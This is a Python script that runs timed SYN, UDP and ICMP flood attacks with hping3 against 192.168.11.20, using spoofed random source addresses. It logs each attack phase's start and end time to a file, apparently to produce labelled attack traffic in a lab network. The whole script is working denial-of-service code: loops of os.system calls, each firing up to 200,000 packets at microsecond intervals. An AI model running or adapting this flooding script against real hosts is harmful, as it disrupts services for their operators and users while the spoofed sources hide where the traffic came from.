import random
import os
import time
import sys
file = '/home/slave/timerecord.txt'


localtime = time.asctime(time.localtime(time.time()))
with open(file, 'a+') as f:
     f.write('script begin: ' + str(localtime) + '\n')

time.sleep(1800)

localtime = time.asctime(time.localtime(time.time()))
with open(file, 'a+') as f:
     f.write('syn attack begin: ' + str(localtime) + '\n')

for i in range(1, 41):
    cnt = random.randint(150000, 200000)
    cmd = "hping3 -c " + str(cnt) + " -S -p 80 --rand-source 192.168.11.20 -i u100"
    print(cmd)
    os.system(cmd)

localtime = time.asctime(time.localtime(time.time()))
with open(file, 'a+') as f:
     f.write('syn attack end: ' + str(localtime) + '\n')

time.sleep(600)

localtime = time.asctime(time.localtime(time.time()))
with open(file, 'a+') as f:
     f.write('UDP attack begin : ' + str(localtime) + '\n')


for i in range(1, 41):
    size = random.randint(64, 150)
    cnt = random.randint(150000, 200000)
    cmd = "hping3 -c " + str(cnt) + " -2 -p 80 -i u100 --rand-source 192.168.11.20 -d " + str(size)
    print(cmd)
    os.system(cmd)

localtime = time.asctime(time.localtime(time.time()))
with open(file, 'a+') as f:
     f.write('UDP attack end: ' + str(localtime) + '\n')


time.sleep(600)


localtime = time.asctime(time.localtime(time.time()))
with open(file, 'a+') as f:
     f.write('ICMP attack begin : ' + str(localtime) + '\n')


for i in range(1, 41):
    cnt = random.randint(150000, 200000)
    cmd = "hping3 -c " + str(cnt) + " -1 --rand-source 192.168.11.20 -i u100"
    print(cmd)
    os.system(cmd)


localtime = time.asctime(time.localtime(time.time()))
with open(file, 'a+') as f:
     f.write('All attack end: ' + str(localtime) + '\n')




